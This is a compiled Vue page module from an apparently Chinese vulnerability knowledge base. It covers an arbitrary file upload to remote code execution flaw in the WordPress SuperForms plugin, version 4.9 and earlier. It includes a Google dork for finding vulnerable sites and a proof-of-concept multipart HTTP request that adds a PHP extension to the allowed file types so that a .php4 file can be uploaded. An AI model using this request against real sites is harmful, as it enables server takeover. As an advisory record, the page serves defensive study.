import{_ as l}from"./plugin-vue_export-helper-c27b6911.js";import{r as a,o as d,c as t,a as e,b as n,d as s,e as r}from"./app-58e4a7d6.js";const o={},c=e("h2",{id:"漏洞描述",tabindex:"-1"},[e("a",{class:"header-anchor",href:"#漏洞描述","aria-hidden":"true"},"#"),n(" 漏洞描述")],-1),u={href:"https://renstillmann.github.io/super-forms/#/",target:"_blank",rel:"noopener noreferrer"},v=e("p",null,"参考链接：",-1),m={href:"https://www.exploit-db.com/exploits/49490",target:"_blank",rel:"noopener noreferrer"},p=r(`<h2 id="漏洞影响" tabindex="-1"><a class="header-anchor" href="#漏洞影响" aria-hidden="true">#</a> 漏洞影响</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>All (&lt;= 4.9.X)
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="google-dork" tabindex="-1"><a class="header-anchor" href="#google-dork" aria-hidden="true">#</a> Google Dork</h2><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>inurl:&quot;/wp-content/plugins/super-forms/&quot;
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div></div></div><h2 id="漏洞复现" tabindex="-1"><a class="header-anchor" href="#漏洞复现" aria-hidden="true">#</a> 漏洞复现</h2><p>poc：</p><div class="language-text line-numbers-mode" data-ext="text"><pre class="language-text"><code>POST /wp-content/plugins/super-forms/uploads/php/ HTTP/1.1
 &lt;=== exploit end point
Host: localhost
User-Agent: UserAgent
Accept: application/json, text/javascript, */*; q=0.01
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data;
boundary=---------------------------423513681827540048931513055996
Content-Length: 7058
Origin: localhost
Connection: close
Referer: localhost
Cookie: 

-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name=&quot;accept_file_types&quot;

jpg|jpeg|png|gif|pdf|JPG|JPEG|PNG|GIF|PDF                        &lt;=======
inject extension (|PHP4) to validate file to upload
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name=&quot;max_file_size&quot;

8000000
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name=&quot;image_library&quot;

0
-----------------------------423513681827540048931513055996
Content-Disposition: form-data; name=&quot;files[]&quot;;
filename=&quot;filename.(extension)&quot;    &lt;====   inject code extension (.php4)
for example
Content-Type: application/pdf

Evil codes to be uploaded

-----------------------------423513681827540048931513055996--

# Uploaded Malicious File can  be Found in :
/wp-content/uploads/superforms/2021/01/&lt;id&gt;/filename.php4
u can get &lt;id&gt; from server reply .
</code></pre><div class="line-numbers" aria-hidden="true"><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div><div class="line-number"></div></div></div>`,7);function b(h,_){const i=a("ExternalLinkIcon");return d(),t("div",null,[c,e("p",null,[n("SuperForms官方链接："),e("a",u,[n("https://renstillmann.github.io/super-forms/#/"),s(i)])]),v,e("ul",null,[e("li",null,[e("a",m,[n("https://www.exploit-db.com/exploits/49490"),s(i)])])]),p])}const x=l(o,[["render",b],["__file","WordPress SuperForms 4.9 任意文件上传到远程代码执行.html.vue"]]);export{x as default};
